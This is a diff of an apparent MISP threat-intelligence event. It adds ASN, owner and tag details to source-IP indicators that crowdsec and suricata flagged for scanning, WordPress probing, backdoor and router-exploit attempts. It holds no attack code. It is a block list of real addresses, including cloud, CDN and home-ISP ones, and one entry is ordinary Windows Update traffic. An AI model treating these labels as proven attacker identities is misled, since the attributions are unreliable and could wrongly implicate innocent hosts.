         "type": "ip-src",
@@ -2641,15 +3105,31 @@
         "to_ids": true,
         "uuid": "a0428422-1d1e-4445-993c-2f44cc2b5288",
         "distribution": "5",
-        "timestamp": "1776603498",
-        "comment": "Sources: suricata | first_seen: 2026-04-19T05:13:26Z | last_seen: 2026-04-19T05:13:26Z | hits: 1 | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "timestamp": "1777078845",
+        "comment": "Sources: suricata | first_seen: 2026-04-19T05:13:26Z | last_seen: 2026-04-19T05:13:26Z | hits: 1 | AS15435 KABELFOON - DELTA Fiber Nederland B.V. (62.45.0.0/16) | scenarios: suricata/SURICATA HTTP unable to match response to request",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "62.45.67.8",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2657,15 +3137,45 @@
         "to_ids": true,
         "uuid": "9a389342-7915-47ae-8826-e55a8f72e5c4",
         "distribution": "5",
-        "timestamp": "1776646810",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-19T22:52:09Z | last_seen: 2026-04-19T22:52:15Z | hits: 5 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777078846",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-19T22:52:09Z | last_seen: 2026-04-19T22:52:15Z | hits: 5 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.48.0.0/12) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.63.32.193",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2673,15 +3183,45 @@
         "to_ids": true,
         "uuid": "a1e34238-1e62-4a10-9466-7de4a9cd1800",
         "distribution": "5",
-        "timestamp": "1776646811",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-19T22:24:40Z | last_seen: 2026-04-19T22:24:40Z | hits: 1 | scenarios: crowdsec/http-probing",
+        "timestamp": "1777078847",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-19T22:24:40Z | last_seen: 2026-04-19T22:24:40Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.64.0.0/10) | scenarios: crowdsec/http-probing",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.100.201.159",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2689,15 +3229,31 @@
         "to_ids": true,
         "uuid": "9b97b5dd-eab1-4858-99b9-02fb2fc9248d",
         "distribution": "5",
-        "timestamp": "1776646812",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-19T18:26:53Z | last_seen: 2026-04-19T18:26:53Z | hits: 1 | scenarios: crowdsec/http-cve-probing",
+        "timestamp": "1777078849",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-19T18:26:53Z | last_seen: 2026-04-19T18:26:53Z | hits: 1 | AS402253 SKN-NETWORK-1 - SKN Subnet & Telecom Ltd (209.99.184.0/21) | scenarios: crowdsec/http-cve-probing",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "209.99.191.31",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2705,15 +3261,31 @@
         "to_ids": true,
         "uuid": "f3bd6618-7b4d-4b5f-be49-36aeb1a13ef2",
         "distribution": "5",
-        "timestamp": "1776646813",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-19T15:53:20Z | last_seen: 2026-04-19T15:53:22Z | hits: 3 | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-sensitive-files",
+        "timestamp": "1777078849",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-19T15:53:20Z | last_seen: 2026-04-19T15:53:22Z | hits: 3 | AS140947 SNTHOSTINGS-AS-AP SnTHostings (103.153.182.0/23) | scenarios: crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-sensitive-files",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "103.153.183.69",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2721,15 +3293,31 @@
         "to_ids": true,
         "uuid": "d12fa97f-78b6-40aa-be33-c3b47abe65ac",
         "distribution": "5",
-        "timestamp": "1776646813",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-19T14:13:01Z | last_seen: 2026-04-19T14:13:03Z | hits: 3 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777078850",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-19T14:13:01Z | last_seen: 2026-04-19T14:13:03Z | hits: 3 | AS31898 ORACLE-BMC-31898 - Oracle Corporation (129.150.32.0/19) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "129.150.46.46",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2737,15 +3325,45 @@
         "to_ids": true,
         "uuid": "9dc23db3-c138-4e0e-9fb4-b2e38d860dc6",
         "distribution": "5",
-        "timestamp": "1776646814",
-        "comment": "Sources: suricata | first_seen: 2026-04-19T22:26:27Z | last_seen: 2026-04-19T22:26:27Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777078851",
+        "comment": "Sources: suricata | first_seen: 2026-04-19T22:26:27Z | last_seen: 2026-04-19T22:26:27Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.11",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2753,15 +3371,31 @@
         "to_ids": true,
         "uuid": "13a40a5b-20b1-4121-80c5-f5c6e1ccc612",
         "distribution": "5",
-        "timestamp": "1776646815",
-        "comment": "Sources: suricata | first_seen: 2026-04-19T17:04:22Z | last_seen: 2026-04-19T17:04:22Z | hits: 1 | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
+        "timestamp": "1777078852",
+        "comment": "Sources: suricata | first_seen: 2026-04-19T17:04:22Z | last_seen: 2026-04-19T17:04:22Z | hits: 1 | AS14593 SPACEX-STARLINK - Space Exploration Technologies Corporation (153.66.136.0/23) | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "153.66.137.154",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2769,15 +3403,45 @@
         "to_ids": true,
         "uuid": "bf60eed8-224d-4e5d-911b-60d6b45586de",
         "distribution": "5",
-        "timestamp": "1776646815",
-        "comment": "Sources: suricata | first_seen: 2026-04-19T14:47:30Z | last_seen: 2026-04-19T14:47:30Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777078853",
+        "comment": "Sources: suricata | first_seen: 2026-04-19T14:47:30Z | last_seen: 2026-04-19T14:47:30Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.0",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2785,15 +3449,31 @@
         "to_ids": true,
         "uuid": "e483ed7d-17b3-4dae-9176-3845b3e0e845",
         "distribution": "5",
-        "timestamp": "1776690011",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T00:35:17Z | last_seen: 2026-04-20T00:35:17Z | hits: 2 | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
+        "timestamp": "1777078853",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T00:35:17Z | last_seen: 2026-04-20T00:35:17Z | hits: 2 | AS20115 CHARTER-20115 - Charter Communications LLC (174.85.64.0/18) | scenarios: suricata/ET HUNTING Suspicious Chmod Usage in URI (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "174.85.76.128",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2801,15 +3481,45 @@
         "to_ids": true,
         "uuid": "feed1305-185f-48f5-b21e-43147bd3919e",
         "distribution": "5",
-        "timestamp": "1776690012",
-        "comment": "Sources: crowdsec, suricata | first_seen: 2026-04-20T07:07:37Z | last_seen: 2026-04-20T07:07:37Z | hits: 3 | scenarios: crowdsec/http-cve-probing, crowdsec/netgear_rce, suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt",
+        "timestamp": "1777078854",
+        "comment": "Sources: crowdsec, suricata | first_seen: 2026-04-20T07:07:37Z | last_seen: 2026-04-20T07:07:37Z | hits: 3 | AS59257 CMPAKLIMITED-AS-AP CMPak Limited (223.123.72.0/24) | scenarios: crowdsec/http-cve-probing, crowdsec/netgear_rce, suricata/SERVER-WEBAPP Netgear DGN1000 series routers authentication bypass attempt",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "223.123.72.23",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2817,15 +3527,45 @@
         "to_ids": true,
         "uuid": "b04c30dc-4310-48ac-a0d7-30be9db05db1",
         "distribution": "5",
-        "timestamp": "1776690012",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-20T06:13:55Z | last_seen: 2026-04-20T06:14:01Z | hits: 4 | scenarios: crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777078856",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-20T06:13:55Z | last_seen: 2026-04-20T06:14:01Z | hits: 4 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (20.192.0.0/10) | scenarios: crowdsec/http-backdoors-attempts, crowdsec/http-crawl-non_statics, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "20.219.138.200",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2833,15 +3573,31 @@
         "to_ids": true,
         "uuid": "ba9409c9-5408-49b8-929e-7488719f220b",
         "distribution": "5",
-        "timestamp": "1776690013",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T05:35:42Z | last_seen: 2026-04-20T05:35:42Z | hits: 1 | scenarios: suricata/SURICATA HTTP Host header invalid",
+        "timestamp": "1777078856",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T05:35:42Z | last_seen: 2026-04-20T05:35:42Z | hits: 1 | AS21499 GODADDY-SXB - Host Europe GmbH (92.205.0.0/19) | scenarios: suricata/SURICATA HTTP Host header invalid",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "92.205.26.97",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2849,15 +3605,45 @@
         "to_ids": true,
         "uuid": "4a14454d-a9b1-4f44-91fa-c86a36529c8d",
         "distribution": "5",
-        "timestamp": "1776690014",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T02:56:44Z | last_seen: 2026-04-20T02:56:44Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777122023",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T02:56:44Z | last_seen: 2026-04-25T07:26:17Z | hits: 2 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response | payloads: GET /d/msdownload/update/software/defu/2026/04/am_delta_patch_1.449.276.0_8d68fe5589bb054ab7e7259b910c032e1f634255.exe?cacheHostOrigin=3.au.download.windowsupdate.com",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.3",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2865,15 +3651,31 @@
         "to_ids": true,
         "uuid": "4e83b3a5-22a8-4c6d-b938-86e5824a1672",
         "distribution": "5",
-        "timestamp": "1776690014",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T11:22:16Z | last_seen: 2026-04-20T11:22:16Z | hits: 1 | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
+        "timestamp": "1777078858",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T11:22:16Z | last_seen: 2026-04-20T11:22:16Z | hits: 1 | AS14061 DIGITALOCEAN-ASN - DigitalOcean (164.92.96.0/19) | scenarios: suricata/ET SCAN Zmap User-Agent (Inbound)",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "164.92.117.229",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2881,15 +3683,31 @@
         "to_ids": true,
         "uuid": "64ce3274-5dd9-46c9-a912-9faebb1d2d59",
         "distribution": "5",
-        "timestamp": "1776733210",
-        "comment": "Sources: crowdsec | first_seen: 2026-04-20T17:08:13Z | last_seen: 2026-04-20T17:08:16Z | hits: 3 | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-wordpress-scan",
+        "timestamp": "1777290756",
+        "comment": "Sources: crowdsec | first_seen: 2026-04-20T17:08:13Z | last_seen: 2026-04-20T17:08:16Z | hits: 3 | AS13335 CLOUDFLARENET - Cloudflare (104.28.235.0/24) | scenarios: crowdsec/http-admin-interface-probing, crowdsec/http-probing, crowdsec/http-wordpress-scan",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "104.28.235.59",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "7",
+            "name": "source:crowdsec",
+            "colour": "#8f8fbf",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2897,15 +3715,45 @@
         "to_ids": true,
         "uuid": "c7c46157-456d-4767-8ac5-570577138e24",
         "distribution": "5",
-        "timestamp": "1776733211",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T18:07:23Z | last_seen: 2026-04-20T18:07:23Z | hits: 1 | scenarios: suricata/SURICATA SSH invalid banner",
+        "timestamp": "1777290757",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T18:07:23Z | last_seen: 2026-04-20T18:07:23Z | hits: 1 | AS16509 AMAZON-02 - Amazon.com (3.131.0.0/16) | scenarios: suricata/SURICATA SSH invalid banner",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "3.131.220.121",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "12",
+            "name": "mwl:cloud=\"aws\"",
+            "colour": "#d5cf47",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2913,15 +3761,31 @@
         "to_ids": true,
         "uuid": "3682ae21-fe6b-42d6-afd5-1c967b995397",
         "distribution": "5",
-        "timestamp": "1776733212",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T17:33:57Z | last_seen: 2026-04-20T17:33:57Z | hits: 1 | scenarios: suricata/SURICATA HTTP unable to match response to request",
+        "timestamp": "1777290757",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T17:33:57Z | last_seen: 2026-04-20T17:33:57Z | hits: 1 | AS49870 AS49870-BV - Alsycon B.V. (160.119.76.0/23) | scenarios: suricata/SURICATA HTTP unable to match response to request",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "160.119.76.17",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2929,15 +3793,45 @@
         "to_ids": true,
         "uuid": "64eb543a-bc95-485c-bc33-fac536513f20",
         "distribution": "5",
-        "timestamp": "1776733212",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T17:33:17Z | last_seen: 2026-04-20T17:33:17Z | hits: 1 | scenarios: suricata/SURICATA SSH invalid banner",
+        "timestamp": "1777290757",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T17:33:17Z | last_seen: 2026-04-20T17:33:17Z | hits: 1 | AS16509 AMAZON-02 - Amazon.com (3.144.0.0/13) | scenarios: suricata/SURICATA SSH invalid banner",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "3.151.241.153",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "12",
+            "name": "mwl:cloud=\"aws\"",
+            "colour": "#d5cf47",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2945,15 +3839,45 @@
         "to_ids": true,
         "uuid": "93f43273-60b4-44cb-bd54-164f70095c60",
         "distribution": "5",
-        "timestamp": "1776733213",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T15:56:52Z | last_seen: 2026-04-20T15:56:52Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777290758",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T15:56:52Z | last_seen: 2026-04-20T15:56:52Z | hits: 1 | AS8075 MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation (172.160.0.0/11) | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "172.189.127.1",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          },
+          {
+            "id": "10",
+            "name": "mwl:cloud=\"azure\"",
+            "colour": "#22f07d",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2961,15 +3885,31 @@
         "to_ids": true,
         "uuid": "dfadd4c3-7035-4d3f-9f85-108a0a3873be",
         "distribution": "5",
-        "timestamp": "1776733214",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T15:23:21Z | last_seen: 2026-04-20T15:23:21Z | hits: 1 | scenarios: suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port",
+        "timestamp": "1777290758",
+        "comment": "Sources: suricata | first_seen: 2026-04-20T15:23:21Z | last_seen: 2026-04-20T15:23:21Z | hits: 1 | AS48721 FLYSERVERS-ENDCLIENTS - Flyservers S.A. (194.165.16.0/24) | scenarios: suricata/ET SCAN MS Terminal Server Traffic on Non-standard Port",
         "deleted": false,
         "disable_correlation": false,
         "object_relation": null,
         "first_seen": null,
         "last_seen": null,
         "value": "194.165.16.166",
-        "Galaxy": []
+        "Galaxy": [],
+        "Tag": [
+          {
+            "id": "9",
+            "name": "source:suricata",
+            "colour": "#99cd0a",
+            "exportable": true,
+            "user_id": "0",
+            "hide_tag": false,
+            "numerical_value": null,
+            "is_galaxy": false,
+            "is_custom_galaxy": false,
+            "local_only": false,
+            "local": false,
+            "relationship_type": null
+          }
+        ]
       },
       {
         "type": "ip-src",
@@ -2977,15 +3917,45 @@
         "to_ids": true,
         "uuid": "3c7a0450-047f-406f-9386-3211d1885faf",
         "distribution": "5",
-        "timestamp": "1776733214",
-        "comment": "Sources: suricata | first_seen: 2026-04-20T22:26:28Z | last_seen: 2026-04-20T22:26:28Z | hits: 1 | scenarios: suricata/ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
+        "timestamp": "1777290758",
